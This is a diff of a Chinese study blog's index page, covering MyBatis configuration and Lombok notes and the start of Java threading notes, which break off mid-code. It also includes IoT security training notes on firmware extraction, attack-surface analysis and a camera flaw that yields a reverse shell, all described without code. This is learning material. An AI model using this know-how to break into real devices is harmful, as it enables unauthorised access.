+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">    &lt;settings&gt;</span><br><span class="line">        &lt;setting name&#x3D;&quot;logImpl&quot; value&#x3D;&quot;LOG4J&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;settings&gt;</span><br></pre></td></tr></table></figure>
+<p>使用输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[org.apache.ibatis.logging.LogFactory]-Logging initialized using &#39;class org.apache.ibatis.logging.log4j.Log4jImpl&#39; adapter.</span><br><span class="line">[org.apache.ibatis.logging.LogFactory]-Logging initialized using &#39;class org.apache.ibatis.logging.log4j.Log4jImpl&#39; adapter.</span><br><span class="line">[org.apache.ibatis.datasource.pooled.PooledDataSource]-PooledDataSource forcefully closed&#x2F;removed all connections.</span><br><span class="line">[org.apache.ibatis.datasource.pooled.PooledDataSource]-PooledDataSource forcefully closed&#x2F;removed all connections.</span><br><span class="line">[org.apache.ibatis.datasource.pooled.PooledDataSource]-PooledDataSource forcefully closed&#x2F;removed all connections.</span><br><span class="line">[org.apache.ibatis.datasource.pooled.PooledDataSource]-PooledDataSource forcefully closed&#x2F;removed all connections.</span><br><span class="line">[org.apache.ibatis.transaction.jdbc.JdbcTransaction]-Opening JDBC Connection</span><br><span class="line">[org.apache.ibatis.datasource.pooled.PooledDataSource]-Created connection 1261198850.</span><br><span class="line">[org.apache.ibatis.transaction.jdbc.JdbcTransaction]-Setting autocommit to false on JDBC Connection [com.mysql.jdbc.JDBC4Connection@4b2c5e02]</span><br><span class="line">[com.kuang.dao.UserDao.selectUser]-&#x3D;&#x3D;&gt;  Preparing: select * from user</span><br><span class="line">[com.kuang.dao.UserDao.selectUser]-&#x3D;&#x3D;&gt; Parameters: </span><br><span class="line">[com.kuang.dao.UserDao.selectUser]-&lt;&#x3D;&#x3D;      Total: 3</span><br><span class="line">User&#123;id&#x3D;1, name&#x3D;&#39;a&#39;, pwd&#x3D;&#39;b&#39;&#125;</span><br><span class="line">User&#123;id&#x3D;2, name&#x3D;&#39;c&#39;, pwd&#x3D;&#39;d&#39;&#125;</span><br><span class="line">User&#123;id&#x3D;3, name&#x3D;&#39;a&#39;, pwd&#x3D;&#39;b&#39;&#125;</span><br><span class="line">[org.apache.ibatis.transaction.jdbc.JdbcTransaction]-Resetting autocommit to true on JDBC Connection [com.mysql.jdbc.JDBC4Connection@4b2c5e02]</span><br><span class="line">[org.apache.ibatis.transaction.jdbc.JdbcTransaction]-Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@4b2c5e02]</span><br><span class="line">[org.apache.ibatis.datasource.pooled.PooledDataSource]-Returned connection 1261198850 to pool.</span><br></pre></td></tr></table></figure>
+
+<p>使用方法二(日志级别）：<br>导入包(不要导java.util的）：<code>import org.apache.log4j.Logger;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void testLog4j()&#123;</span><br><span class="line">    Logger logger &#x3D; Logger.getLogger(UserDaoTest.class);</span><br><span class="line">    logger.info(&quot;info:进入了testLog4j&quot;);</span><br><span class="line">    logger.debug(&quot;debug:进入了testLog4j&quot;);</span><br><span class="line">    logger.error(&quot;error:进入了testLog4j&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>7、limit使用java传参<br>UserDao.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; getUserByLimit(Map&lt;String,Integer&gt; map);</span><br></pre></td></tr></table></figure>
+<p>UserMapper.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id&#x3D;&quot;getUserByLimit&quot; parameterType&#x3D;&quot;map&quot; resultType&#x3D;&quot;user&quot;&gt;</span><br><span class="line">    select * from user limit #&#123;startIndex&#125;,#&#123;pageSize&#125;</span><br><span class="line">&lt;&#x2F;select&gt;</span><br></pre></td></tr></table></figure>
+<p>UserDaoTest.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void getUserByLimit()&#123;</span><br><span class="line">    &#x2F;&#x2F;第一步：获得SqlSession对象</span><br><span class="line">    SqlSession sqlSession &#x3D; MybatisUtils.getSession();</span><br><span class="line">    UserDao userDao &#x3D; sqlSession.getMapper(UserDao.class);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;String, Integer&gt; map &#x3D; new HashMap&lt;String,Integer&gt;();</span><br><span class="line">    map.put(&quot;startIndex&quot;,0);</span><br><span class="line">    map.put(&quot;pageSize&quot;,2);</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt; userList &#x3D; userDao.getUserByLimit(map);</span><br><span class="line">    for(User user : userList)&#123;</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;关闭SqlSession</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>7.2 RowBounds分页（不建议使用）<br>直接封装成方法,不再使用sql语句<br><code>sqlSession.selectList()</code><br>可以安装各种插件（如PageHelper），也可以用，但是自己无法控制它内部使用的sql语句，限制很多</p>
+<p>8、使用注解开发<br>UserDao.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Select(&quot;select * from user&quot;)</span><br><span class="line">List&lt;User&gt; getUsers();</span><br></pre></td></tr></table></figure>
+<p>mybatis-config.xml(绑定接口)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;mappers&gt;</span><br><span class="line">    &lt;mapper resource&#x3D;&quot;com.kuang.dao.UserDao&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;mappers&gt;</span><br></pre></td></tr></table></figure>
+<p>UserDaoTest.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void test()&#123;</span><br><span class="line">    &#x2F;&#x2F;第一步：获得SqlSession对象</span><br><span class="line">    SqlSession sqlSession &#x3D; MybatisUtils.getSession();</span><br><span class="line">    UserDao userDao &#x3D; sqlSession.getMapper(UserDao.class);</span><br><span class="line">    List&lt;User&gt; userList &#x3D; userDao.getUser();</span><br><span class="line">    for(User user : userList)&#123;</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;关闭SqlSession</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>也可以实现增删改</p>
+<p>但是难以解决数据库和实体类名不同的问题！！</p>
+<p>9.运行流程（自己总结）：<br>主要文件：MybatisUtils.java,UserDao.java,UserMapper.xml,UserDaoTest.java,mybatis-config.xml,User.java,db.properties,log4j.properties</p>
+<p>（1）主程序UserDaoTest.java实例化MybatisUtils.java<br>（2）MybatisUtils.java先将mybatis-config.xml加载进类，根据mybatis-config.xml的信息将User.java,db.properties,log4j.propertie,UserMapper.xml这几个配置文件加载进类<br>（3）主程序UserDaoTest.java利用MybatisUtils.java类中的getMapper方法引入UserDao.java这个接口文件里的所有接口<br>（4）调用UserDao.java的接口，会访问接口名对应的UserMapper.xml中id相同的项，实现数据库操作</p>
+<p>10.Lombok<br>（1）安装（idea自动安装了）<br>（2）导入包</p>
+<p>@Getter and @Setter<br>@FieldNameConstants<br>@ToString<br>@EqualsAndHashCode<br>@AllArgsConstructor, @RequiredArgsConstructor and @NoArgsConstructor<br>@Log, @Log4j, @Log4j2, @Slf4j, @XSlf4j, @CommonsLog, @JBossLog, @Flogger, @CustomLog<br>@Data<br>@Builder<br>@SuperBuilder<br>@Singular<br>@Delegate<br>@Value<br>@Accessors<br>@Wither<br>@With<br>@SneakyThrows<br>@val<br>@var<br>experimental @var<br>@UtilityClass<br>Lombok config system</p>
+<p>好处：再也不用写get，set等方法了，直接在class前面加一个注解，类就会自动带有这些方法！！（偷懒专用）<br>@Data:无参构造，get、set、tostring、hashcode、equals<br>@AllArgsConstructorer：有参<br>@NoArgsConstructor：无参</p>
+<p>举例：以下两个作用相等！！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.pojo;</span><br><span class="line"></span><br><span class="line">import lombok.AllArgsConstructor;</span><br><span class="line">import  lombok.Data;</span><br><span class="line">import lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">@AllArgsConstructorer </span><br><span class="line">@NoArgsConstructor</span><br><span class="line">public class User&#123;</span><br><span class="line">    private int id;</span><br><span class="line">    private String name;</span><br><span class="line">    private String pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.pojo;</span><br><span class="line"></span><br><span class="line">public class User &#123;</span><br><span class="line">    private int id;</span><br><span class="line">    private String name;</span><br><span class="line">    private String pwd;</span><br><span class="line"></span><br><span class="line">    public User() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public User(int id, String name, String pwd) &#123;</span><br><span class="line">        this.id &#x3D; id;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">        this.pwd &#x3D; pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getId() &#123;</span><br><span class="line">        return id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setId(int id) &#123;</span><br><span class="line">        this.id &#x3D; id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPwd() &#123;</span><br><span class="line">        return pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPwd(String pwd) &#123;</span><br><span class="line">        this.pwd &#x3D; pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;id&#x3D;&quot; + id +</span><br><span class="line">                &quot;, name&#x3D;&#39;&quot; + name + &#39;\&#39;&#39; +</span><br><span class="line">                &quot;, pwd&#x3D;&#39;&quot; + pwd + &#39;\&#39;&#39; +</span><br><span class="line">                &#39;&#125;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>坏处是：代码的可阅读性降低，像是这种插件必须要明白插件作用才能审代码</p>
+<p>审代码会变困难，而且可能会添加很多没用的代码（后台），造成代码冗余和内存浪费，感觉和c上来就引用所有库差不多<br>写的人方便，读和运行的人会麻烦</p>
+<p>11.复杂查询环境（一对多，多对一）<br>略，以后有用再说吧</p>
+<p>12.动态sql<br>拼接不同sql语句：（意味着一般使用mybatis难以出现sql注入漏洞）<br><a target="_blank" rel="noopener" href="https://mybatis.org/mybatis-3/zh/dynamic-sql.html">https://mybatis.org/mybatis-3/zh/dynamic-sql.html</a></p>
+<p>13.缓存<br>将内容保存在内存中，直接访问内存进行查询<br>略，以后有用再说</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/02/27/MyBatis%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-hws线上笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/02/08/hws%E7%BA%BF%E4%B8%8A%E7%AC%94%E8%AE%B0/">hws线上笔记</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/02/08/hws%E7%BA%BF%E4%B8%8A%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-02-08T05:56:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>IOT<br>作为设备本身就是个完整的计算机，需要硬件知识</p>
+<p>IOT能干什么？<br>通过外部路由器打进外网，然后拿到小米音响的shell，进而控制台灯、音响、风扇、扫地机器人的开关（补天杯，IOT全场景的破解）<br>通过云管理平台攻击企业级AP（纯内网，完全ping不通ip）获取SHELL进而渗透<br>没有钥匙的情况下，黑掉一台车开走（天府杯）（宝骏的汽车，最新版的系统）</p>
+<p>什么是IOT？<br>从设备侧来说：是可以联网的嵌入式设备，就是一个完成的计算机<br>什么是嵌入式？<br>从计算机的角度说：就是能控制更多种类的外设的专用计算机</p>
+<p>文章/视频推荐<br>【朱有鹏】嵌入式1.1ARM那些你得知道的事儿<br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1L4411t7Df?from=search&amp;seid=11271188295963278674&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1L4411t7Df?from=search&amp;seid=11271188295963278674&amp;spm_id_from=333.337.0.0</a></p>
+<p>单片机向左，嵌入式向右<br><a target="_blank" rel="noopener" href="https://blog.51cto.com/astonzhu/2061513">https://blog.51cto.com/astonzhu/2061513</a></p>
+<p>站在2018看单片机和嵌入式芯片方案选型和发展趋势<br><a target="_blank" rel="noopener" href="https://blog.51cto.com/astonzhu/2135684">https://blog.51cto.com/astonzhu/2135684</a></p>
+<p>Arduino、arm、树莓派、单片机四者有什么不同？<br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/21045562">https://www.zhihu.com/question/21045562</a><br>（应用场景不同的计算机）</p>
+<p>现在的冰箱：linux，windows，android</p>
+<p>（神秘的程序员们）</p>
+<p>了解硬件：去玩我的世界，尝试用红石电路的或门与门非门搭一个冯诺依曼计算机出来</p>
+<p>什么是固件？<br>固化在设备上的软件（通常而言指的是Flash中被固化、执行固定功能的软件）<br>PC上就是BIOS（虚拟机上让选过）<br>PC主机：<br>CPU中内存之下还有一块区域，就是BIOS</p>
+<p>固件获取：<br>1.互联网搜索<br>（1）官网：DNS，路由器，电视盒子<br>（2）DIY论坛<br>（3）搜索<br>（4）渗透<br>2.获取更新包<br>（1）触发更新（被动/主动）<br>（2）更新检测（FTP/HTTP/HTTPS）<br>（3）下载固件（update，bin）<br>3.拆设备（360黑客马拉松IoT破解赛，48小时拆各种设备）<br>认板子，确认哪个是电源模块，CPU，存储器，存储单元，外部I/O设备，调试接口，然后找到Flash，读取（怎样快速认识：芯片上有印字，然后查找）（论坛：家电维修论坛，我爱音频网，恩山无线论坛，什么值得买）<br>区分flash的类型，找连接方式<br>读取：编程器（维修行业术语，用于flash读写）（推荐：EZP xpro v2）<br>固件解包：binwalk，mount<br>通过熵值来判断是否加密（binwalk）（加密具有更高熵值）<br>（私货（拉仇恨）：华为大部分都加密，但是小米很多都不加密）</p>
+<p>分类截图：</p>
+<p>逆向截图：<br>IDE<br>分析攻击面：设备对输入进行处理的全流程<br>输入意味着有接口<br>处理意味着有逻辑</p>
+<p>首先分析有哪些输入：</p>
+<p>例：oppo摄像头的TF卡执行漏洞（启动时会读取sd卡，所以在那个路径下挂tf，执行一个反弹shell</p>
+<p>嵌入式基本上用c语言（为了效率），为什么不用rust？因为生态没有建好，会c的程序员多</p>
+<p>定位程序：找厂商的二进制文件<br>1.屏蔽操作系统自带的二进制，定位厂商定义的服务<br>2.开源组件安全，低版本1day漏洞</p>
+<p>搜索字符串（非常有用）<br>递归查找字符串<code>grep -Rn &quot;mqtt&quot; 2 &gt; /dev/null</code></p>
+<p>强网杯 2021 线下 RW Mi Router</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/02/08/hws%E7%BA%BF%E4%B8%8A%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-JavaWeb笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -995,358 +1721,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/01/16/pte%E5%9F%B9%E8%AE%AD/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-pte课程（基础复习）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/15/pte%E8%AF%BE%E7%A8%8B%EF%BC%88%E5%9F%BA%E7%A1%80%E5%A4%8D%E4%B9%A0%EF%BC%89/">pte课程（基础复习）</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2022/01/15/pte%E8%AF%BE%E7%A8%8B%EF%BC%88%E5%9F%BA%E7%A1%80%E5%A4%8D%E4%B9%A0%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2022-01-15T00:28:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/15/pte%E8%AF%BE%E7%A8%8B%EF%BC%88%E5%9F%BA%E7%A1%80%E5%A4%8D%E4%B9%A0%EF%BC%89/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-Java-多线程笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/12/Java-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AC%94%E8%AE%B0/">Java-多线程笔记</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2022/01/12/Java-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2022-01-12T11:23:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>继承Thread类：<br>1.自定义线程类继承Thread<br>2.重写run()方法<br>3.创建此案城对象，调用start()方法启动线程（以子线程的方式运行run()方法，所以并不会有start()方法的定义）<br>(不建议使用：避免OOP单继承的局限性)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">import java.net.SocketOption;</span><br><span class="line"></span><br><span class="line">public class TestTread1 extends Thread &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        &#x2F;&#x2F;run方法线程体</span><br><span class="line">        for(int i&#x3D;1;i&lt;&#x3D;20;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(&quot;123&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F;main主线程</span><br><span class="line">        TestTread1 testTread1 &#x3D; new TestTread1();</span><br><span class="line">        testTread1.start();&#x2F;&#x2F;调用start()方法开启线程</span><br><span class="line"></span><br><span class="line">        for(int i&#x3D;1;i&lt;&#x3D;2000;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(&quot;456&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;运行时会发现，输出123是在456之间进行的</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>下载网图：<br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1V4411p7EF?p=4">https://www.bilibili.com/video/BV1V4411p7EF?p=4</a></p>
-<p>Runnable接口：<br>用Thread类来调用start()<br>好处：方便用一个对象被多个线程调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">import java.net.SocketOption;</span><br><span class="line"></span><br><span class="line">public class TestTread1 implements Runnable&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        &#x2F;&#x2F;run方法线程体</span><br><span class="line">        for(int i&#x3D;1;i&lt;&#x3D;20;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(&quot;123&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F;main主线程</span><br><span class="line">        TestTread1 testTread1 &#x3D; new TestTread1();</span><br><span class="line">        Thread thread&#x3D;new Thread(testTread1);</span><br><span class="line">        